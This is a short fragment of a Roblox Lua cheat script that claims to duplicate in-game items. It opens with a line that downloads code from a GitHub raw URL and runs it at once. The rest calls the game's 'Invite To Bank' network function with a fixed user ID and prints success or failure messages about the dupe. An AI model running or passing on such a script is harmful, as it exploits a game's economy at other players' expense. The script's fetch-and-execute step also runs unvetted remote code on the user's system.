loadstring(game:HttpGet("https://github.com/nguyenaman23/dupe/raw/main/dupe.lua"))();
...
end if lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'],  1828861235) then lib.Message.New("Dupe successfully! please rejoin"); else lib.Message.New("Dupe failure frowning please try again"); end;
